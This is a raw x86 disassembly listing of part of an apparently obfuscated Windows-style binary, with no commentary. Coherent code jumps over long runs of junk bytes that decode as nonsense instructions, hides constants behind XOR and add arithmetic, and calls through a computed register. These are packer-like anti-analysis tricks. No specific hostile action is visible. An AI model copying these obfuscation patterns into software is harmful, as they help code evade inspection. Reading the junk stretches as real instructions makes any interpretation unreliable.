  402198:	mov    eax,DWORD PTR [ebp-0x20]
  40219b:	inc    edi
  40219c:	cmp    edi,eax
  40219e:	jb     0x401676
  4021a4:	jmp    0x402298
  4021a9:	mov    eax,DWORD PTR [ebp-0x4]
  4021ac:	xor    eax,esi
  4021ae:	add    eax,ebx
  4021b0:	jmp    0x402c24
  4021b5:	mov    eax,DWORD PTR [ebp-0x2c]
  4021b8:	movzx  eax,WORD PTR [eax+edi*2]
  4021bc:	mov    ecx,DWORD PTR [ebp-0x14]
  4021bf:	mov    eax,DWORD PTR [ecx+eax*4]
  4021c2:	jmp    0x402295
  4021c7:	lods   eax,DWORD PTR ds:[esi]
  4021c8:	adc    ah,BYTE PTR [edi+0x7d7da75f]
  4021ce:	jmp    0x5811:0xa7f835f7
  4021d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021d6:	lods   al,BYTE PTR ds:[esi]
  4021d7:	xchg   esi,eax
  4021d8:	jbe    0x402256
  4021da:	jl     0x40217e
  4021dc:	jl     0x40225a
  4021de:	jl     0x40220c
  4021e0:	(bad)  
  4021e1:	enter  0x808,0x45
  4021e5:	or     eax,0x2f212c60
  4021ea:	outs   dx,BYTE PTR ds:[esi]
  4021eb:	aaa    
  4021ec:	inc    eax
  4021ed:	and    DWORD PTR [edi+0x8561f08],esi
  4021f3:	and    eax,0x2f8ea3b9
  4021f8:	js     0x4021eb
  4021fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021fb:	pushf  
  4021fc:	sbb    eax,0x65ee7a28
  402201:	or     al,BYTE PTR [ebx+ebx*8]
  402204:	jp     0x402253
  402206:	pop    edx
  402207:	cdq    
  402208:	hlt    
  402209:	fidivr DWORD PTR [ecx-0x47329639]
  40220f:	mov    edx,0xc5894e5a
  402214:	and    BYTE PTR [ebx],bl
  402216:	out    0xf5,eax
  402218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402219:	in     eax,0x16
  40221b:	and    al,0x71
  40221d:	push   ebx
  40221e:	cmp    esp,esi
  402220:	aad    0x7f
  402222:	ins    DWORD PTR es:[edi],dx
  402223:	lahf   
  402224:	in     al,dx
  402225:	sub    al,0x75
  402227:	fdiv   st(6),st
  402229:	nop
  40222a:	call   0x36d9:0x52e4ad73
  402231:	add    BYTE PTR [ebx+0x6249fc8b],0x40
  402238:	pop    ebx
  402239:	ror    ah,0x9d
  40223c:	jg     0x4021c2
  40223e:	cmp    cl,ch
  402240:	out    0x6c,eax
  402242:	popf   
  402243:	push   ds
  402244:	mov    esp,0x1d09e74d
  402249:	icebp  
  40224a:	mov    ch,0xb2
  40224c:	cwde   
  40224d:	ins    DWORD PTR es:[edi],dx
  40224e:	push   es
  40224f:	sub    edx,DWORD PTR [eax+0x4e1326be]
  402255:	stc    
  402256:	cli    
  402257:	and    al,0xb0
  402259:	pop    esi
  40225a:	mov    ds:0x2d9bf5dc,eax
  40225f:	mov    cl,0x88
  402261:	scas   eax,DWORD PTR es:[edi]
  402262:	inc    esi
  402263:	and    eax,0x2867086
  402268:	dec    edx
  402269:	std    
  40226a:	stos   BYTE PTR es:[edi],al
  40226b:	or     eax,0xd7809d3e
  402270:	push   ds
  402271:	shr    DWORD PTR [ebx+0x5448f0e0],1
  402277:	test   BYTE PTR [edx],dl
  402279:	pop    ebp
  40227a:	shl    BYTE PTR [ecx+0x663d00cd],0xd2
  402281:	dec    esp
  402282:	add    eax,0x9dad9a97
  402287:	push   edi
  402288:	mov    edx,0xd4558a8a
  40228d:	adc    eax,esp
  40228f:	inc    edx
  402290:	leave  
  402291:	dec    eax
  402292:	cli    
  402293:	mov    al,ds:0xc45891e
  402298:	mov    eax,DWORD PTR [ebp-0x4]
  40229b:	mov    ecx,DWORD PTR [ebp-0x8]
  40229e:	jmp    0x402371
  4022a3:	xchg   ebx,eax
  4022a4:	sub    al,BYTE PTR [esp+eax*1]
  4022a7:	cdq    
  4022a8:	cmp    dl,BYTE PTR [ebx+0x426f4fbd]
  4022ae:	mov    dh,0xdb
  4022b0:	pop    ecx
  4022b1:	jno    0x402310
  4022b3:	fmul   QWORD PTR [ecx]
  4022b5:	jl     0x402333
  4022b7:	mov    ds:0x2f7c7c7c,al
  4022bc:	out    0xe,al
  4022be:	and    bl,BYTE PTR [ecx+ebx*8+0x29]
  4022c2:	into   
  4022c3:	add    esi,DWORD PTR [eax-0x42e6d3fe]
  4022c9:	add    esi,edx
  4022cb:	mov    al,0x74
  4022cd:	mov    ah,0xb8
  4022cf:	sbb    eax,0x1c12612e
  4022d4:	jmp    0x29ca:0xfc3ed208
  4022db:	xor    bl,0x7
  4022de:	ret    
  4022df:	test   BYTE PTR ds:0xbf2cddef,al
  4022e5:	add    BYTE PTR [ecx-0xf],bl
  4022e8:	cdq    
  4022e9:	push   ds
  4022ea:	test   DWORD PTR [eax+0x7],esp
  4022ed:	mov    al,ds:0xe19312de
  4022f2:	jbe    0x4022a4
  4022f4:	xor    al,dh
  4022f6:	test   DWORD PTR [esi],esp
  4022f8:	rcr    BYTE PTR [edx-0x32297e04],0xdc
  4022ff:	ds and eax,0x3fd93bd7
  402305:	popa   
  402306:	sbb    bh,BYTE PTR [ebx+0x50]
  402309:	or     bl,BYTE PTR [eax]
  40230b:	outs   dx,BYTE PTR ds:[esi]
  40230c:	shl    BYTE PTR [edx],0xf7
  40230f:	and    eax,0x33826a46
  402314:	imul   eax,DWORD PTR [eax+edx*1],0x46
  402318:	xchg   esp,eax
  402319:	pop    esp
  40231a:	add    esp,DWORD PTR [eax+0x2c10e348]
  402320:	push   0xffffffca
  402322:	or     al,0x37
  402324:	aad    0x23
  402326:	call   0x9a22:0xcd324361
  40232d:	mov    bh,0x26
  40232f:	outs   dx,DWORD PTR ds:[esi]
  402330:	scas   eax,DWORD PTR es:[edi]
  402331:	scas   eax,DWORD PTR es:[edi]
  402332:	xchg   DWORD PTR [ebx-0x24908853],edx
  402338:	stos   DWORD PTR es:[edi],eax
  402339:	add    eax,0xc06f7b9c
  40233e:	pop    ebp
  40233f:	test   eax,0x1a7b2444
  402344:	cmp    al,0x1c
  402347:	jne    0x4022d2
  402349:	mov    ebx,0xda21a37f
  40234e:	sbb    eax,0xb0f9aa51
  402353:	cli    
  402354:	jbe    0x4023cf
  402356:	jmp    0x5073:0x911681f3
  40235d:	mov    cl,0x4f
  40235f:	pop    esp
  402360:	(bad)  
  402362:	pop    ebp
  402363:	xor    dl,BYTE PTR [edx-0x2]
  402366:	popa   
  402367:	rcr    DWORD PTR [edi],0x73
  40236a:	push   ss
  40236b:	stc    
  40236c:	(bad)  
  40236d:	aad    0x5e
  40236f:	test   DWORD PTR [esi*1+0x7510857],edi
  402376:	add    eax,ebx
  402378:	cmp    ecx,eax
  40237a:	jne    0x40238d
  402380:	mov    eax,DWORD PTR [ebp-0x4]
  402383:	xor    eax,0x7510857
  402388:	jmp    0x4021ae
  40238d:	mov    eax,DWORD PTR [ebp+0xc]
  402390:	add    eax,DWORD PTR [ebp+0x8]
  402393:	mov    DWORD PTR [ebp-0x10],eax
  402396:	mov    eax,DWORD PTR [ebp-0x1c]
  402399:	test   eax,eax
  40239b:	je     0x4026e4
  4023a1:	mov    DWORD PTR [ebp-0x24],esi
  4023a4:	push   0xb
  4023a6:	pop    ecx
  4023a7:	push   0x5
  4023a9:	dec    ecx
  4023aa:	pop    ebx
  4023ab:	xchg   ebx,ecx
  4023ad:	sub    ebx,ecx
  4023af:	xchg   ebx,ecx
  4023b1:	dec    ecx
  4023b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4023b5:	imul   eax,ecx
  4023b8:	sub    esp,eax
  4023ba:	mov    DWORD PTR [ebp-0x24],esp
  4023bd:	mov    eax,DWORD PTR [ebp-0x4]
  4023c0:	mov    ecx,0x7510857
  4023c5:	xor    eax,ecx
  4023c7:	mov    edx,0x32729e
  4023cc:	add    eax,edx
  4023ce:	mov    DWORD PTR [ebp+0x8],eax
  4023d1:	jmp    0x4024a4
  4023d6:	cmp    dl,BYTE PTR [esi+0x7b653be5]
  4023dc:	cli    
  4023dd:	test   eax,0x3babd173
  4023e2:	ins    BYTE PTR es:[edi],dx
  4023e3:	mov    ds:0x802f53c,al
  4023e8:	jl     0x402466
  4023ea:	mov    ds:0x987c7c7c,al
  4023ef:	mov    ah,0xc2
  4023f1:	mov    al,0x91
  4023f3:	xor    ch,BYTE PTR [esi+0x33]
  4023f6:	outs   dx,DWORD PTR ds:[esi]
  4023f7:	repnz aam 0xc4
  4023fa:	enter  0xf7d3,0xaf
  4023fe:	pop    ecx
  4023ff:	push   esi
  402400:	and    al,0x65
  402402:	and    bl,BYTE PTR [ecx]
  402404:	imul   edx,DWORD PTR [esi+ecx*4-0x4f],0x79
  402409:	adc    BYTE PTR [ecx+esi*4-0x10e63117],al
  402410:	add    eax,0x4c629281
  402415:	or     BYTE PTR [ebp+edx*4+0x57aa3f43],0xfc
  40241d:	jmp    0x3a9b:0x3fa0001c
  402424:	xchg   edx,eax
  402425:	jne    0x40240a
  402427:	int    0xf6
  402429:	popa   
  40242a:	push   edi
  40242b:	seto   BYTE PTR [ecx+0x39ba608f]
  402432:	sub    eax,0x41868896
  402437:	imul   ebp,ebp,0xb
  40243a:	dec    edi
  40243b:	aas    
  40243c:	mov    esi,ebp
  40243e:	shl    DWORD PTR [ebx],0x92
  402441:	mov    edx,0x902b760f
  402446:	jge    0x402435
  402448:	nop
  402449:	cs jb  0x4023cd
  40244c:	stc    
  40244d:	call   DWORD PTR [edx]
  40244f:	or     ah,BYTE PTR [ebp+0x14c32e7b]
  402455:	rcl    dh,1
  402457:	push   ecx
  402458:	and    eax,0x93e03d3d
  40245d:	into   
  40245e:	cli    
  40245f:	xchg   DWORD PTR [edx],ecx
  402461:	mov    BYTE PTR [ebp+0xf1e0fe],ah
  402467:	inc    esi
  402468:	jae    0x40240a
  40246a:	sbb    ah,bl
  40246c:	arpl   di,bp
  40246e:	pop    ebx
  40246f:	call   0x857f360f
  402474:	popf   
  402475:	or     bl,bl
  402477:	in     eax,dx
  402478:	cs cmc 
  40247a:	dec    eax
  40247b:	(bad)  
  40247c:	ins    BYTE PTR es:[edi],dx
  40247d:	fadd   QWORD PTR [edi+0x5b]
  402480:	int3   
  402481:	mov    edx,0x45443ecc
  402486:	shr    BYTE PTR [edx+0x63a39a56],1
  40248c:	(bad)  
  40248d:	fsub   QWORD PTR [ecx+ecx*4]
  402490:	jmp    0xd51b:0xd423474d
  402497:	outs   dx,DWORD PTR ds:[esi]
  402498:	loop   0x4024af
  40249a:	and    al,0xd0
  40249c:	loope  0x40249b
  40249e:	inc    esp
  40249f:	or     DWORD PTR [ebp+0x2],eax
  4024a2:	add    BYTE PTR [ecx-0x75],bl
  4024a5:	inc    ebp
  4024a6:	call   0xc243e5de
  4024ab:	mov    edx,DWORD PTR [ebp+0x14]
  4024ae:	jmp    0x402581
  4024b3:	and    al,0x81
  4024b5:	rep ins BYTE PTR es:[edi],dx
  4024b7:	lods   eax,DWORD PTR ds:[esi]
  4024b8:	(bad)  
  4024b9:	sti    
  4024ba:	pop    ecx
  4024bb:	xor    DWORD PTR [ebx],0x26b6bfae
  4024c1:	push   cs
  4024c2:	in     eax,0x48
  4024c4:	or     BYTE PTR [esp+edi*2-0x5e],bh
  4024c8:	jl     0x402546
  4024ca:	jl     0x4024fd
  4024cc:	pop    esp
  4024cd:	imul   ebp,DWORD PTR [edx],0xffffff9f
  4024d0:	adc    ebp,DWORD PTR [eax+0x56c5005f]
  4024d6:	adc    ecx,ecx
  4024d8:	daa    
  4024d9:	test   BYTE PTR [esi-0x73742198],dl
  4024df:	rcl    DWORD PTR [edi+0x15f4f160],1
  4024e5:	xchg   ecx,eax
  4024e6:	je     0x4024ba
  4024e8:	mov    bh,0x16
  4024ea:	adc    al,al
  4024ec:	stos   DWORD PTR es:[edi],eax
  4024ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024ee:	xchg   eax,ecx
  4024f0:	js     0x4024fe
  4024f2:	gs sbb al,0x3c
  4024f5:	add    cl,ah
  4024f7:	sub    DWORD PTR [edx+0x1da94a2e],ebx
  4024fd:	nop
  4024fe:	adc    DWORD PTR es:[edi+0x2f],edi
  402502:	dec    edi
  402503:	mov    ds:0x73ef7f0c,eax
  402508:	mov    eax,ds:0xaeed7ed4
  40250d:	aam    0x86
  40250f:	xchg   ebx,eax
  402510:	xchg   edi,eax
  402511:	(bad)  
  402512:	jae    0x40252f
  402514:	push   cs
  402515:	pusha  
  402516:	aad    0xe7
  402518:	jmp    0xdc8e0cb
  40251d:	stos   DWORD PTR es:[edi],eax
  40251e:	inc    ecx
  40251f:	js     0x40254f
  402521:	jne    0x4024c6
  402523:	pop    ecx
  402524:	sar    dh,0xc4
  402527:	in     al,0xab
  402529:	inc    ecx
  40252a:	mov    ebx,0xa289b1f
  40252f:	mul    DWORD PTR [edx-0x1]
  402532:	mov    al,0xc0
  402534:	jno    0x402554
  402536:	mov    ecx,0x20589754
  40253b:	sahf   
  40253c:	outs   dx,DWORD PTR ds:[esi]
  40253d:	pop    ebp
  40253e:	in     eax,dx
  40253f:	sub    esi,DWORD PTR [eax+esi*4-0x6e678ad9]
  402546:	and    DWORD PTR [esi+esi*1+0x73],ebp
  40254a:	dec    ecx
  40254b:	loope  0x40259d
  40254d:	cmp    dl,BYTE PTR [ecx-0x75]
  402550:	mov    ebx,0x713a000d
  402555:	imul   ebx,DWORD PTR ds:[eax],0xe42e2b03
  40255c:	rcl    BYTE PTR [edi+esi*1+0x68e780cf],0x8e
  402564:	dec    esp
  402565:	imul   ebx,DWORD PTR [esi],0x35
  402568:	dec    esi
  402569:	jno    0x40257c
  40256b:	retf   
  40256c:	mul    BYTE PTR [edi+edi*1-0x6a94bb79]
  402573:	cmc    
  402574:	clc    
  402575:	dec    ebp
  402576:	mov    WORD PTR [ebp+0x1b],gs
  402579:	add    eax,0x4dd796d0
  40257e:	jno    0x40256e
  402580:	arpl   WORD PTR [edi],cx
  402582:	scas   eax,DWORD PTR es:[edi]
  402583:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  402589:	mov    ecx,DWORD PTR [ebp+0x8]
  40258c:	lea    ecx,[edx+ecx*1+0x32729e]
  402593:	cmp    ecx,eax
  402595:	je     0x4026df
  40259b:	mov    edi,DWORD PTR [ebp-0x18]
  40259e:	mov    eax,DWORD PTR [ebp+0x8]
  4025a1:	mov    edx,DWORD PTR [ebp+0x14]
  4025a4:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4025a8:	mov    ecx,0x7510857
  4025ad:	xor    edx,edx
  4025af:	xor    edi,ecx
  4025b1:	mov    esi,0x32729e
  4025b6:	add    edi,esi
  4025b8:	div    edi
  4025ba:	mov    edx,DWORD PTR [ebp-0x4]
  4025bd:	xor    edx,ecx
  4025bf:	lea    eax,[edx+eax*1+0x32729e]
  4025c6:	mov    edx,DWORD PTR [ebp+0x8]
  4025c9:	mov    edi,DWORD PTR [ebp-0x24]
  4025cc:	mov    DWORD PTR [edi+edx*4],eax
  4025cf:	mov    eax,DWORD PTR [ebp-0x18]
  4025d2:	mov    edx,DWORD PTR [ebp+0x8]
  4025d5:	xor    eax,ecx
  4025d7:	lea    eax,[eax+edx*1+0x32729e]
  4025de:	mov    DWORD PTR [ebp+0x8],eax
  4025e1:	mov    eax,DWORD PTR [ebp-0x18]
  4025e4:	mov    edx,DWORD PTR [ebp+0x14]
  4025e7:	xor    eax,ecx
  4025e9:	add    eax,esi
  4025eb:	imul   eax,DWORD PTR [edx]
  4025ee:	mov    edx,DWORD PTR [ebp-0x4]
  4025f1:	xor    edx,ecx
  4025f3:	mov    ecx,DWORD PTR [ebp+0x8]
  4025f6:	lea    ecx,[edx+ecx*1+0x32729e]
  4025fd:	cmp    ecx,eax
  4025ff:	jne    0x40259b
  402605:	jmp    0x4026d8
  40260a:	xlat   BYTE PTR ds:[ebx]
  40260b:	pop    esp
  40260c:	cmp    DWORD PTR [eax-0x47],eax
  40260f:	pop    ebp
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	jnp    0x4025e8
  402613:	sbb    ch,bl
  402615:	mov    ebp,esp
  402617:	repz inc edx
  402619:	sar    dh,cl
  40261b:	or     edi,DWORD PTR [esp+edi*2-0x5e]
  40261f:	jl     0x40269d
  402621:	jl     0x4025cd
  402623:	cdq    
  402624:	adc    eax,0x95c0ffa0
  402629:	mov    cl,BYTE PTR [edi+0x313bb291]
  40262f:	lds    esi,FWORD PTR [ebx*8-0x1923170]
  402636:	icebp  
  402637:	gs cmp eax,0x2464118a
  40263d:	lahf   
  40263e:	jno    0x402628
  402640:	rcl    eax,cl
  402642:	jle    0x40262e
  402644:	cs cld 
  402646:	loop   0x4025f8
  402648:	ds push 0x0
  40264b:	sahf   
  40264c:	lods   eax,DWORD PTR ds:[esi]
  40264d:	out    0x69,eax
  40264f:	pop    ecx
  402650:	or     BYTE PTR [esi-0x2407ede],0x2a
  402657:	test   eax,0x4d97fd49
  40265c:	push   0xeeaab1f9
  402661:	loop   0x40262f
  402663:	out    dx,al
  402664:	jbe    0x402645
  402666:	inc    edx
  402667:	jp     0x402670
  402669:	cmp    al,0xa0
  40266b:	test   al,0x12
  40266d:	cmp    al,bl
  40266f:	push   ebx
  402670:	sbb    edx,eax
  402672:	clc    
  402673:	mov    ah,0x14
  402675:	add    eax,0xf8176f38
  40267a:	adc    dl,dh
  40267c:	btc    DWORD PTR [ebx+0xc],eax
  402680:	and    eax,0x4f6e1cf4
  402685:	cmp    esi,DWORD PTR [esi-0x7adb3182]
  40268b:	sti    
  40268c:	mov    bh,0xb3
  40268e:	and    al,0x56
  402690:	pop    ecx
  402691:	jmp    0x82bd:0x8d884e6
  402698:	stos   BYTE PTR es:[edi],al
  402699:	mov    ecx,0xb8005075
  40269e:	pusha  
  40269f:	fstp   TBYTE PTR [ebp+0x1de0c4d4]
  4026a5:	jns    0x402717
  4026a7:	aaa    
  4026a8:	cmp    DWORD PTR [edx+eiz*2+0x4c],eax
  4026ac:	retf   0xd960
  4026af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026b0:	jnp    0x4026c8
  4026b2:	dec    ecx
  4026b3:	retf   0x5602
  4026b6:	jns    0x40264a
  4026b8:	xor    al,0x83
  4026ba:	adc    ah,dh
  4026bc:	mov    ebp,DWORD PTR [edi]
  4026be:	fcom   DWORD PTR [eax+0x11897924]
  4026c4:	add    DWORD PTR [ebp+edx*8-0x352fc072],edx
  4026cb:	inc    ecx
  4026cc:	in     al,0x2e
  4026ce:	iret   
  4026cf:	jmp    0x402713
  4026d1:	jl     0x402731
  4026d3:	ret    
  4026d4:	loope  0x4026a0
  4026d6:	aad    0xf9
  4026d8:	mov    ebx,esi
  4026da:	jmp    0x4026e4
  4026df:	mov    ebx,0x32729e
  4026e4:	mov    eax,DWORD PTR [ebp-0x4]
  4026e7:	xor    eax,0x7510857
  4026ec:	jmp    0x4027bf
  4026f1:	(bad)  
  4026f2:	fsubr  st(2),st
  4026f4:	mov    esp,0x647a42fa
  4026f9:	clc    
  4026fa:	(bad)  
  4026fb:	mov    WORD PTR [ecx-0x28],?
  4026fe:	nop
  4026ff:	jmp    0xa27c:0x7c0a2401
  402706:	jl     0x402784
  402708:	jl     0x4026b3
  40270a:	ret    0x828
  40270d:	fild   QWORD PTR [edx]
  40270f:	call   0xfc08:0x17e48687
  402716:	cmp    eax,0x6d43641
  40271b:	iret   
  40271c:	(bad)
  40271f:	ins    DWORD PTR es:[edi],dx
  402720:	out    0xb1,eax
  402722:	xchg   ebp,eax
  402723:	pop    ss
  402724:	imul   edx,DWORD PTR [edi-0x2cb1bd7e],0xf2437cfb
  40272e:	mov    edi,0x73b2a0d4
  402733:	inc    ebx
  402734:	cwde   
  402735:	or     ebp,DWORD PTR [edx-0x74]
  402738:	jecxz  0x402719
  40273a:	sbb    eax,0x2f95960e
  40273f:	add    esi,DWORD PTR [edx+0x40]
  402742:	repnz std 
  402744:	test   eax,0x9535db16
  402749:	mov    BYTE PTR ds:0xb6390e90,0x8e
  402750:	jmp    0x82d7:0x2edfc24d
  402757:	(bad)  
  402758:	fsubr  QWORD PTR [ebx-0x19]
  40275b:	aam    0x64
  40275d:	add    al,0x0
  40275f:	pop    ecx
  402760:	and    esi,DWORD PTR [edi+0x629aa976]
  402766:	xchg   edx,eax
  402767:	sub    esp,edi
  402769:	add    dl,ah
  40276b:	mov    al,ds:0xb731d781
  402770:	fcom   st(3)
  402772:	pop    ss
  402773:	repnz (bad) 
  402775:	aas    
  402776:	aas    
  402777:	add    DWORD PTR [ecx+0x6f1940ac],ebx
  40277d:	xlat   BYTE PTR ds:[ebx]
  40277e:	push   esp
  40277f:	jle    0x402776
  402781:	out    dx,eax
  402782:	retf   
  402783:	test   eax,0x5a947f38
  402788:	and    cl,BYTE PTR [ebp-0x20ce9934]
  40278e:	js     0x4027d7
  402790:	gs pop esp
  402792:	pop    ss
  402793:	push   si
  402795:	jmp    0xa09e68bd
  40279a:	ror    BYTE PTR [ebx+0x7147a424],1
  4027a0:	sub    BYTE PTR [esi+0x7d],cl
  4027a3:	xor    DWORD PTR [edi+ebp*2],ecx
  4027a6:	dec    eax
  4027a7:	pop    eax
  4027a8:	or     edi,DWORD PTR [edx+0x2d308c2a]
  4027ae:	mov    esp,0xb1c33fd1
  4027b3:	(bad)  
  4027b4:	arpl   WORD PTR [ecx-0x535558e8],di
  4027ba:	les    edx,FWORD PTR [ecx]
  4027bc:	stos   DWORD PTR es:[edi],eax
  4027bd:	leave  
  4027be:	popa   
  4027bf:	add    eax,ebx
  4027c1:	mov    DWORD PTR [ebp-0xc],eax
  4027c4:	jmp    0x402897
  4027c9:	pop    ebp
  4027ca:	fimul  WORD PTR [ebp+eiz*8+0x567d65bb]
  4027d1:	cdq    
  4027d2:	push   es
  4027d3:	mov    si,0xb8c4
  4027d7:	pop    esi
  4027d8:	mov    dh,0x6a
  4027da:	or     bh,BYTE PTR [esp+edi*2-0x5e]
  4027de:	jl     0x40285c
  4027e0:	jl     0x402825
  4027e2:	gs ret 0x2f45
  4027e6:	inc    ecx
  4027e7:	shl    bh,1
  4027e9:	pop    ebx
  4027ea:	and    eax,0x9e90de29
  4027ef:	hlt    
  4027f0:	inc    esi
  4027f1:	ja     0x40285c
  4027f3:	arpl   WORD PTR [edx],dx
  4027f5:	and    eax,0x26c6ffc1
  4027fa:	fld    QWORD PTR [eax]
  4027fc:	addps  xmm7,XMMWORD PTR [ebp+0x23]
  402800:	lds    ebx,FWORD PTR [ecx+0x4cc1aeb3]
  402806:	mov    esi,0x29699c9d
  40280b:	and    ecx,eax
  40280d:	pop    edi
  40280e:	or     al,0x6c
  402810:	jbe    0x402802
  402812:	jb     0x402859
  402814:	push   es
  402815:	mov    WORD PTR [eax-0x23],ss
  402818:	aam    0xf5
  40281a:	jecxz  0x40283e
  40281c:	je     0x4027c6
  40281e:	(bad)  
  40281f:	(bad)  
  402820:	mov    eax,ds:0x2c5db804
  402825:	adc    BYTE PTR [edi],bh
  402827:	sbb    al,0x7e
  402829:	jmp    0x521d:0x87849cfe
  402830:	(bad)  
  402831:	push   ebp
  402832:	xchg   BYTE PTR [edi],bh
  402834:	or     eax,0xafbaa827
  402839:	sbb    eax,0xb99c9db6
  40283e:	pop    esp
  40283f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402840:	into   
  402841:	inc    edi
  402842:	and    eax,0xab6936bd
  402847:	(bad)  
  402848:	sub    al,0xce
  40284a:	imul   edi,DWORD PTR [edi+ebx*2+0x7e],0xffffffe9
  40284f:	xor    al,0x5d
  402851:	je     0x40280c
  402853:	or     DWORD PTR [eax+eiz*8-0x63622f],ebx
  40285a:	mov    ds:0xc78aea32,eax
  40285f:	inc    ebx
  402860:	push   esp
  402861:	aam    0x24
  402863:	arpl   WORD PTR [esi],di
  402865:	or     BYTE PTR [ebx],cl
  402867:	div    esp
  402869:	stos   BYTE PTR es:[edi],al
  40286a:	xchg   BYTE PTR [edi],dl
  40286c:	(bad)  
  40286d:	shl    DWORD PTR [edi+0x3ce2043f],cl
  402873:	jo     0x4028b8
  402875:	outs   dx,DWORD PTR ds:[esi]
  402876:	in     al,0x65
  402878:	aam    0x1c
  40287a:	scas   eax,DWORD PTR es:[edi]
  40287b:	xor    BYTE PTR [eax-0x6aa6ca0d],dl
  402881:	add    ch,BYTE PTR [esi-0x242b06ba]
  402887:	mov    DWORD PTR [eax],esi
  402889:	and    edi,DWORD PTR [esi+0x1cb875b6]
  40288f:	xlat   BYTE PTR ds:[ebx]
  402890:	sub    dl,BYTE PTR [edi-0x46]
  402893:	nop
  402894:	retf   
  402895:	xor    dh,ch
  402897:	xor    ebx,ebx
  402899:	lea    eax,[ebp-0x10]
  40289c:	add    ebx,DWORD PTR [eax]
  40289e:	call   ebx
  4028a0:	xor    ebx,ebx
  4028a2:	inc    ebx
  4028a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4028a6:	jmp    0x402979
  4028ab:	jmp    0x4028ef
  4028ad:	inc    esp
  4028ae:	ins    BYTE PTR es:[edi],dx
  4028af:	jns    0x40292b
  4028b1:	jmp    0x402910
  4028b3:	loope  0x40292e
  4028b5:	pushf  
  4028b6:	sbb    bl,0x34
  4028b9:	mov    ds:0x7c0d9034,al
  4028be:	jl     0x402862
  4028c0:	jl     0x40293e
  4028c2:	jl     0x40284e
  4028c4:	call   0xf95f:0x3439679e
  4028cb:	fbstp  TBYTE PTR [edx-0x7a]
  4028ce:	dec    ebx
  4028cf:	inc    edi
  4028d0:	jl     0x40291a
  4028d2:	in     al,0x6a
  4028d4:	rol    ah,0xe
  4028d7:	jne    0x40288b
  4028d9:	xor    cl,BYTE PTR [edi-0x7c]
  4028dc:	mov    esi,0x80b4a295
  4028e1:	mov    WORD PTR ds:0x536fc16e,ds
  4028e7:	ds into 
  4028e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028ea:	cdq    
  4028eb:	jbe    0x402872
  4028ed:	mov    eax,ds:0x90eb1222
  4028f2:	stos   BYTE PTR es:[edi],al
  4028f3:	xor    DWORD PTR [edi],ecx
  4028f5:	mov    ds:0xb1805127,eax
  4028fa:	sub    cl,BYTE PTR [ecx-0x5244443f]
  402900:	inc    ebp
  402901:	aas    
  402902:	xor    dl,BYTE PTR [eax+0xf773b8c]
  402908:	or     ch,ah
  40290a:	fsub   st,st(2)
  40290c:	pop    esp
  40290d:	fisttp QWORD PTR [edx+0x43bc7774]
  402913:	xchg   BYTE PTR [ebx+0x5e],ch
  402916:	push   ecx
  402917:	arpl   WORD PTR [ebp-0x7f],bx
  40291a:	pop    eax
  40291b:	ret    
  40291c:	jnp    0x4028ed
  40291e:	cmp    al,0xb7
  402920:	ud1    ebp,DWORD PTR [ecx-0x48]
  402924:	stos   DWORD PTR es:[edi],eax
  402925:	mov    BYTE PTR [ecx+0x71],cl
  402928:	inc    ebp
  402929:	dec    edx
  40292a:	int3   
  40292b:	mov    al,0x60
  40292d:	cmp    BYTE PTR [eax],dh
  40292f:	out    0x8,al
  402931:	xchg   esi,eax
  402932:	dec    ecx
  402933:	fbstp  TBYTE PTR [ebp+0x63a494db]
  402939:	lea    esp,[edx+0x3312cc45]
  40293f:	mov    ecx,esi
  402941:	(bad)  
  402942:	stc    
  402943:	jo     0x402975
  402945:	push   edx
  402946:	jo     0x4028f5
  402948:	in     eax,dx
  402949:	leave  
  40294a:	pop    ecx
  40294b:	xor    eax,0xc771873c
  402950:	loope  0x402987
  402952:	dec    ebp
  402953:	(bad)  
  402954:	outs   dx,BYTE PTR ds:[esi]
  402955:	push   ds
  402956:	xor    BYTE PTR [ebp+ebx*1+0x672d0656],ch
  40295d:	jbe    0x40294f
  40295f:	scas   eax,DWORD PTR es:[edi]
  402960:	dec    edi
  402961:	daa    
  402962:	repnz nop
  402964:	mov    esi,0x4c357902
  402969:	out    0x71,eax
  40296b:	jo     0x402913
  40296d:	jp     0x40290e
  40296f:	sbb    eax,DWORD PTR [esi-0x544ad5d5]
  402975:	faddp  st(5),st
  402977:	mov    dh,0x6
  402979:	je     0x402997
  40297f:	xchg   edx,eax
  402980:	push   0xa
  402982:	pop    ecx
  402983:	push   0x4
  402985:	pop    ebx
  402986:	inc    ebx
  402987:	xchg   ebx,ecx
  402989:	sub    ebx,ecx
  40298b:	xchg   ebx,ecx
  40298d:	dec    ecx
  40298e:	mov    eax,DWORD PTR [ebp-0x1c]
  402991:	imul   eax,ecx
  402994:	add    esp,eax
  402996:	xchg   edx,eax
  402997:	push   eax
  402998:	xor    ebx,ebx
  40299a:	mov    edx,esp
  40299c:	jmp    0x402a6f
  4029a1:	jns    0x4029c0
  4029a3:	inc    ebp
  4029a4:	ds gs mov dh,0x7d
  4029a8:	mov    ebp,0x6beb4b4b
  4029ad:	cmp    al,cl
  4029af:	mov    bl,0x45
  4029b1:	(bad)  
  4029b2:	or     al,0x7c
  4029b4:	jl     0x402958
  4029b6:	jl     0x402a34
  4029b8:	jl     0x4029f5
  4029ba:	or     cl,BYTE PTR [edx]
  4029bc:	mov    bl,0x2c
  4029be:	xchg   esp,eax
  4029bf:	cwde   
  4029c0:	mov    ebp,0x113ea448
  4029c5:	pop    eax
  4029c6:	sub    ebp,DWORD PTR [ecx-0x49]
  4029c9:	leave  
  4029ca:	dec    esp
  4029cb:	pusha  
  4029cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029cd:	fsubp  st(0),st
  4029cf:	mov    ebp,0xe55fa067
  4029d4:	inc    edi
  4029d5:	sub    eax,eax
  4029d7:	mov    ebp,0x33fdacef
  4029dc:	rcl    esi,0x96
  4029df:	ins    BYTE PTR es:[edi],dx
